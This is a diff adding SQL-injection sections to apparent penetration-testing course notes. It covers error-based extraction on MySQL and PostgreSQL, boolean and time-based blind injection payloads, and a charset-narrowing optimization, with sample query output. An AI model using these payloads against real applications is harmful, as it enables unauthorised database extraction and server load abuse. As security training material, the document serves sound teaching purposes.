@@ -813,15 +813,292 @@ You will see different ways to trigger errors, and some applied payload examples
 (see vid-139)
 
 #### 4.4.2. MySQL Error-Based SQLi Exploitation
+To exploit error-based SQL injection on MySQL, we will use the `GROUP BY` statement.
+This statement groups the result-set by one or more columns.
+  Example:
+    The following query selects the screen names from the `accounts` tables.
+    Please note the 2 `David` values:
+    ```
+    mysql> select displayname from accounts;
+      +-------------------+
+      | displayname       |
+      +-------------------+
+      | Aspen Byers       |
+      | Alexandra Cabrera |
+      | David             |
+      | David             |
+      +-------------------+
+      4 rows in set (0.00 sec)
+      ```
 
+    An this is the output of the same query with the `GROUP BY` statement.
+    There is just a single `DAVID` value.
+      ```
+      mysql> select displayname from accounts group by displayname;
+      +-------------------+
+      | displayname       |
+      +-------------------+
+      | Aspen Byers       |
+      | Alexandra Cabrera |
+      | David             |
+      +-------------------+
+      3 rows in set (0.00 sec)
+      ```
 
+The following statement in a skeleton you can use to create your MySQL error-based injections:
+  ```
+  SELECT 1,2 UNION SELECT COUNT(*), CONCAT(<information to extract>, floor(rand(0)*2)) AS x FROM information_schema.tables GROUP BY x;
+  ```
 
+  Example:
+  To extract the database version (*4.5.43-0+deb7u1* in this example) you can use:
+      ```
+      mysql> SELECT COUNT(*), CONCAT(version(), floor(rand(0)*2)) AS x FROM information_schema.tables GROUP BY x;
+      ERROR 1062 (23000): Duplicate entry '4.5.43-0+deb7u1' for key 'group_key'
+      ```
 
+#### 4.4.3. PostgreSQL Error-Based SQLi Exploitation
+  To exploit a SQLi on a web application using **PostgreSQL**, you have to leverage the cast technique we saw for MSSQL.
+    Example:
+    You can use this technique to extract the DB version:
+      ```
+      # select cast(version() as numeric);
+      ERROR: invalid input syntax for type numeric: "PostgreSQL 9.1.15 on x86_64-unknown-linux-gnu, compiled by gcc (Debian 4.7.2-5) 4.7.2, 64-bit"
+      ```
+    Or the tables, by iterating over the *information_schema* special database:
+      ```
+      dbname=# select cast((select table_name from information_schema.tables limit 1 offset 0) as numeric);
+      ERROR: invalid input syntax for type numeric: "pg_statistics"
+      dbname=# select cast((select table_name from information_schema.tables limit 1 offset 1) as numeric);
+      ERROR: invalid input syntax for type numeric: "pg_type"
+      dbname=# select cast((select table_name from information_schema.tables limit 1 offset 2) as numeric);
+      ERROR: invalid input syntax for type numeric: "pg_attribute"
+      ```
+
+To exploit an Error-based SQL injection you need the techniques and payload skeletons we have seen in this chapter and you have to study how different DBMS functions work.
+
+You can refer the to the following cheat sheets by *PentestMonkey* to craft your payloads:
+- [MSSQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
+- [MySQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
+- [PostgreSQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)
 
 ____________________________________________________
 ## 4.5. Exploiting Blind SQL Injection
+**Blind SQLi exploitation** is an inference methodology you can to extract database schemas and data.
 
+If the web application is not exploitable via in-band or error-based SQL injections, yet still vulnerable, you can rely on blind exploitation.
 
+This **does not mean** that blind SQL injections are exploitable only if the web application **does not print errors on its output**
+  It simply mans that when crafting a **Boolean based SQLi** payload, you want to transform a query in a True/False condition which reflects its state to the web application output.
+
+In the following slides we will see an example of a blind SQLi, both on one application which prints errors on its outputs, and a different application which does not print errors.
+
+#### 4.5.1. Exploitation Scenario
+In this example, `id` is a vulnerable parameter. (see img-152)
+
+We can guess the dynamic query structure:
+  ```
+  SELECT <fields> FROM <table> WHERE id='<id parameter>';
+  ```
+
+The query probably looks something like:
+  ```
+  SELECT filename, views from images WHERE id='<id parameter>';
+  ```
+
+Now, we can try to trigger an always true condition and see what happens.
+
+We can use `' OR 'a'='a` and see that the application shows an image. (see img-154)
+
+Let us test it with another always true condition: `' OR '1'='1`
+The result is the same.
+
+On the other hand, this is an always **false** condition: `' OR '1'='11`
+It does not find anything in the database: there is **no image and no view counter**. So this is clearly an exploitable SQL injection. (see img-156)
+
+Once penetration testers find a way to tell when a condition is true or false, they can ask the database some simple True/False questions, like:
+- Is the first letter of the username `a`?
+- Does this database contain three tables?
+- And so on...
+
+By using this method, a penetration tester can freely query the database! Let us see an example.
+
+#### 4.5.2. Detecting the Current User
+Example:
+  Let us see a way to find the current database user by using Boolean based blind SQL injections.
+
+  We will use 2 MySQL functions: *user()* and *substring()*
+
+  **user()** returns the name of the user currently using the database:
+    ```
+    mysql> select user();
+    +----------------+
+    | user()         |
+    +----------------+
+    | root@localhost |
+    +----------------+
+    1 row in set (0.00 sec)
+    ```
+
+  **substring()** returns a substring of the given argument. It takes three parameters: the input string, the position of the substring and its length.
+    ```
+    mysql> select substring('elearnsecurity', 2, 1);
+    +-----------------------------------+
+    | substring('elearnsecurity', 2, 1) |
+    +-----------------------------------+
+    | 1                                 |
+    +-----------------------------------+
+    1 row in set (0.00 sec)
+    ```
+
+  Functions can be used as arguments of other functions.
+    ```
+    mysql> select substring(user(), 1, 1);
+    +-------------------------+
+    | substring(user(), 1, 1) |
+    +-------------------------+
+    | r                       |
+    +-------------------------+
+    1 row in set (0.00 sec)
+    ```
+
+  Moreover, SQL allows you to test the output of a function in a True/False condition.
+    ```
+    mysql> select substring(user(), 1, 1) = 'r';
+    +------------------------------+
+    | substring(user(), 1, 1) = 'r'|
+    +------------------------------+
+    | 1                            |                   // True
+    +------------------------------+
+    1 row in set (0.00 sec)
+    mysql> select substring(user(), 1, 1) = 'a';
+    +------------------------------+
+    | substring(user(), 1, 1) = 'a'|
+    +------------------------------+
+    | 0                            |                   // False
+    +------------------------------+
+    1 row in set (0.00 sec)
+    ```
+
+  By combining those features we can iterate over the letters of the username by using payloads such as:
+  - `' or substr(user(), 1, 1) = 'a`
+  - `' or substr(user(), 1, 1) = 'b`
+  - `...`
+
+  When we find the first letter, we can move to the second:
+  - `' or substr(user(), 1, 1) = 'a`
+  - `' or substr(user(), 1, 1) = 'b`
+  - `...`
+
+  We continue down this path until we know the entire username.
+  Here you can see that the first letter of the database username of the web application is `s`. We infer this because we see an image and we know an image is shown only upon a **TRUE** condition (see img-165)
+
+#### 4.5.3. Scripting Blind SQLi Data Dump
+Submitting all the payloads needed to find a username by hand, is very impractical. Doing the same to extract the content of an entire database would be nearly impossible.
+
+In the *SQLMap* chapter you will see how to automate the dumping phase.
+
+Now we can see another example: a web application that does not print any error on its output.
+The methodology used to exploit the SQLi is the same!
+
+  This is the web application output for a *false* condition (`http://localhost/ecommerce.php?id=0 or 1=2`). (see img-168)
+
+  And this is the output for a true condition (`http://localhost/ecommerce.php?id=0 or 1=1`). (see img-169)
+    The string *Nokia* appears only when a correct guess is made (true condition).
+
+  We want to understand what the output looks like when we have a correct guess.
+  We will have to find text in the web page code that will **only** appear for the correct guess: this will let us tell a match from a mismatch.
+    Example:
+      If the value of a field is **Armando**, we will have to make 7 iterations through the whole charset (one per character in the string).
+      We will have made a correct guess when the string *Nokia* will be met in the output.
+
+  Since the main difference between Error-based/in-band and blind sql injections is the large numbers of request performed (and the time consumed as a sequence), our first objective is to narrow down the charset.
+
+  The charset will be our iteration space, so the smaller it is, the sooner we will retrieve the correct value.
+    Example:
+      To retrieve the first letter of string containing **dbo**, we have to submit the following payloads to the web application:
+        Output from the web app: **False**
+        ```
+        999 or SUBSTRING(username(),1,1) = 'a',--
+        ```
+        Output from the web app: **False**
+        ```
+        999 or SUBSTRING(username(),1,1) = 'b',--
+        ```
+        Output from the web app: **False**
+        ```
+        999 or SUBSTRING(username(),1,1) = 'c',--
+        ```
+        Output from the web app: **True**
+        ```
+        999 or SUBSTRING(username(),1,1) = 'd',--
+        ```
+
+        This tells us that the first letter of the username id **d**
+
+#### 4.5.4. Optimized Blind SQL Injections
+It is clear that you will hardly perform manual exploitation of Blind SQL injection vulnerabilities.
+
+However, when building your own BSQLi shell scripts, you need to keep the process as fast as possible.
+
+We will now see a simple technique to reduce the number of request by narrowing down the number of characters in the charset.       
+
+One of the best optimizations you can do to your Blind SQL injection exploitation algorithm, is to reduce the number of iterations you have to do per character.
+
+This means that you need to be able to understand if the character you are trying to guess is:
+- [A-Z]
+- [a-z]
+- [0-9]
+
+We will now review a technique discovered by SecForce.
+
+Tests:
+  The first test is to see if the conversion to upper case of the current character will yield a FALSE or TRUE condition:
+    ```
+    ASCII(UPPER(SUBSTRING((<query), <position>, 1)))= ASCII(SUBSTRING((<query), <position>, 1))
+    ```
+    Keep note of the TRUE or FALSE condition you find.
+    The `ASCII()` SQL function returns the ASCII code of a character.
+    The `UPPER()` function transform a character into uppercase.
+    Finally we test if a character of a query is the same as its uppercase relative.
+      Example:
+        a **does not equals** A
+        A **equals** A
+
+  Then we test if the conversion to lower case of the current character will yield a FALSE or TRUE condition:
+    ```
+    ASCII(LOWER(SUBSTRING((<query), <position>, 1)))= ASCII(SUBSTRING((<query), <position>, 1))
+    ```
+    Keep note of the TRUE of FALSE condition you find.
+    `Lower()` converts a character to lowercase.
+
+  Now its time to evaluate the results:
+  - If the first query returns **TRUE** and the second is **FALSE**, the character is **uppercase**: It will iterate through [A-Z] only
+  - If the first query returns **FALSE** and the second is **TRUE**, the character is **lowercase**: It will iterate through [a-z] only
+  - If **both queries are TRUE** our character is **either a number or a symbol**: We will iterate through [0-9] and symbols only
+
+#### 4.5.5. Time Based Blind SQL Injection
+Another Blind SQL Injection technique is called **Time-Based Blind SQL Injection**. Time is used to infer a TRUE condition from a FALSE condition.
+
+The SQL syntax used:
+  ```
+  %SQL condition% waitfor delay '0:0:5'
+  ```
+  If the SQL condition is TRUE the DBMS will delay for 5 seconds.
+
+Some examples of Time-Based SQL Injection:
+- Check if we are `sa` (MS SQL Server)
+  ```
+  if (select user) = 'sa' waitfor delay '0:0:5'
+  ```
+- Guess a database value (MySQL)
+  ```
+  IF EXISTS (SELECT * FROM users WHERE username = 'armando') BENCHMARK(1000000,MD5(1))
+  ```
+  Benchmark will perform `MD5(1)` function 1000000 times if the IF clause yields TRUE (thus consuming time).
+  You should be careful with the first argument of `BENCHMARK()`. It may seriously affect the server load.
+
+In the following video you will see how to manually exploit a blind SQL injection. You will also see how to write some scripts to automate the exploitation.
 
 ____________________________________________________
 ## 4.6. SQLMap
